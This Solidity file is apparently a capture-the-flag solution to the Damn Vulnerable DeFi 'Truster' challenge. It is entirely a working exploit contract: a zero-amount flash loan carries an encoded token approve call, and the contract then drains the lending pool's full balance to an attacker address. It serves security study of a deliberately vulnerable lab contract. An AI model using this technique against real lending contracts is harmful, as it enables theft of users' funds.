// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrusterLenderPool.sol";

/**
 * @title TrusterAttackContract
 * @author Edoardo Ierina
 */
contract TrusterAttackContract {

    function attack(address poolAddress, address tokenAddress, address attackerAddress) external {
        IERC20 damnValuableToken = IERC20(tokenAddress);
        
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore == 0, "Initial attacker balance should be 0");
        uint256 poolBalance = damnValuableToken.balanceOf(poolAddress);
        require(poolBalance > 0, "Initial pool balance should be greater than 0");

        bytes memory approveCall = abi.encodeWithSelector(damnValuableToken.approve.selector, address(this), poolBalance);

        TrusterLenderPool(poolAddress).flashLoan(0, address(this), address(damnValuableToken), approveCall);

        damnValuableToken.transferFrom(poolAddress, attackerAddress, poolBalance);

        uint256 balanceAfter = damnValuableToken.balanceOf(attackerAddress);
        require(balanceAfter == poolBalance, "Final attacker balance should match initial lender balance");
    }

}
